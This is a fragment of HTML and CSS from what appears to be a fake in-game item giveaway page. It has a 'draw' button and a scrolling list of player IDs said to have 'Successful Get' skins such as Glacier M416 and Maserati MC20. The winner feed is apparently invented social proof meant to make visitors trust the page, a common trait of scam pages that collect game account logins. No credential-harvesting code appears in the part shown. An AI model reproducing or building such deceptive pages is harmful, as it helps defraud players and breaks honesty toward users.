...
.footer {
	...
	height: auto;
	border-left: 2px solid #E0B35B;
	border-right: 2px solid #E0B35B;
	border-top: 0px solid #E0B35B;
...
@media only screen and (max-width:600px) {
	...
	.footer {
	    ...
	    border-left: 2px solid #DDB97F;
	    border-right: 3px solid #DDB97F;
	    border-bottom: 2px solid #DDB97F;	
	}
    .scroll {
        height: 400px;
    }
...
<div>
<center>
<o onclick="audioFile()" onmousedown="buka.play();"><img src="img/draw.png" width="93" height="93" id="js-start"></o>
</center>
</div>
</div>
...
<div class="slider animated fadeIn">ID 5149470362 Successful Get Glacier - M416</div>
<div class="slider animated fadeIn">ID 5504332590 Successful Get Inferno Helmet</div>
<div class="slider animated fadeIn">ID 5242011396 Successful Get 10 Materials</div>
<div class="slider animated fadeIn">ID 5816277559 Successful Get Glacier - M416</div>
<div class="slider animated fadeIn">ID 5768760016 Successful Get Maserati MC20</div>
<div class="slider animated fadeIn">ID 5226032560 Successful Get Mummy Set</div>
</div></div>
</section> <!--- container --->
</div> <!--- cont spin_content --->
</div> <!--- gallery-container --->
<div class="footer">
<div class="footer-txt-copyrights">Partnership Inquiry: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b2c2c7d0d5dfddd0dbded7edd0c7c1dbdcd7c1c1f2c6d7dcd1d7dcc69cd1dddf">[email&#160;protected]</a></div> <!--- footer-txt-copyright --->
...
<br><br>
<img style="width: 90%; height: auto; margin-top: -30px; margin-left: auto; margin-right: auto;" src="img/seseselow.png"><br>
</div> <!--- popup-box-bg --->
<div class="popup-box-footer">
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
